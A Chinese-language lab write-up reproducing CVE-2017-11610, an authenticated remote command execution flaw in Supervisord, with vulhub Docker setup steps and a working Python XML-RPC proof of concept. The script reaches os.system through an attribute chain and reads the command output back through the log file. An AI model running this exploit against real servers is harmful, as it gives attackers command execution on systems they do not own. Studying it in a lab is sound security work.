## 一、漏洞描述
Supervisord是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610）。通过POST请求向Supervisord管理界面提交恶意数据，可以获取服务器操作权限，带来严重的安全风险。  
影响版本  
Supervisord 3.1.2 <= Version <= 3.3.2  

## 二、漏洞环境搭建
1、查看当前环境
ls

2、进入环境内部  
cd /home/kali/Desktop/vulhub-master/supervisor/CVE-2017-11610

3、拉取资源  
docker-compose up -d  

等环境搭建完成后，可以访问 http://your-ip:9001 出现如下页面证明搭建成功！  
your-ip为你搭建环境的IP地址，根据实际情况替换。  

## 三、漏洞复现  
代码POC
```python
#!/usr/bin/env python3
import xmlrpc.client
import sys


if __name__ == '__main__':
    target = "http://192.168.127.129:9001/RPC2"
    command = "id"
    with xmlrpc.client.ServerProxy(target) as proxy:
        old = getattr(proxy, 'supervisor.readLog')(0,0)

        logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
        result = getattr(proxy, 'supervisor.readLog')(0,0)

        print(result[len(old):])
```
运行此POC代码，如果攻击成功，会返回id命令的执行结果。


